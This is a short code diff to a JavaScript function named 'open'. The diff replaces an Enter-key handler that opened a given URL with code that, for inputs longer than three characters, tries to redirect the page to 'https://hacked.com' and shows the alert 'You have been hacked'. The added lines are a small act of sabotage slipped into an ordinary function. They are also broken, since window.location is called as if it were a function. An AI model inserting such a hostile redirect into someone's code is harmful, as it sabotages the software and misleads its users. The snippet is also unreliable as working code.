@@ -1,5 +1,6 @@
 function open(j) {
-  if (event.key === "Enter") {
-    window.open(j.value);
+  if (j.length > 3) {
+    window.location("https://hacked.com");
+    alert("You have been hacked");
   }
 }
